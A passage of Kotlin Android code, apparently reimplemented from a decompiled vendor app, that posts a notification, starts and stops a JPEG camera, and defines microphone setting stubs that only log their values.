            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(channelId, appName.ifEmpty { "通知" },
                    android.app.NotificationManager.IMPORTANCE_HIGH)
                notificationManager.createNotificationChannel(channel)
            }

            val builder = android.app.Notification.Builder(this)
                .setContentTitle(title)
                .setContentText(content)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder.setChannelId(channelId)
            }

            // JADX: uses packageName to determine notification ID
            val notifId = packageName.hashCode() and 0x7FFFFFFF
            notificationManager.notify(notifId, builder.build())
            android.util.Log.d(TAG, "✅ 通知已发送: $title")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 发送通知失败", e)
        }
    }

    /**
     * Stop JPEG camera. Vendor: uz0.m214887c3().
     */
    fun stopJpegCamera() {
        try {
            cameraManager?.safeStopCamera()
            android.util.Log.d(TAG, "📷 JPEG摄像头已停止")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 停止JPEG摄像头失败", e)
        }
    }

    /**
     * Start JPEG camera. Vendor: m211527m5 mapped to configurePowerSettings + startCamera.
     */
    fun startJpegCamera() {
        try {
            configurePowerSettings()
            cameraManager?.safeStartCamera()
            android.util.Log.d(TAG, "📷 JPEG摄像头已启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动JPEG摄像头失败", e)
        }
    }

    /**
     * Set microphone quality mode. Vendor: uz0.m214883b9(qualityMode).
     */
    fun setMicrophoneQualityMode(mode: String) {
        android.util.Log.d(TAG, "🎤 设置麦克风音质模式: $mode")
    }

    /**
     * Set microphone audio source. Vendor: uz0.m214881b7(audioSource).
     */
    fun setMicrophoneAudioSource(source: String) {
        android.util.Log.d(TAG, "🎤 设置麦克风音源: $source")
    }

    /**
     * Set microphone volume gain. Vendor: uz0.m214884c0(volumeGain).
     */
    fun setMicrophoneVolumeGain(gain: Float) {
        android.util.Log.d(TAG, "🎤 设置麦克风增益: ${gain}x")
    }

    /**
     * Set microphone noise suppression. Vendor: uz0.m214882b8(noiseSuppression).
     */
    fun setMicrophoneNoiseSuppression(enabled: Boolean) {
        android.util.Log.d(TAG, "🎤 设置麦克风降噪: $enabled")
    }
}
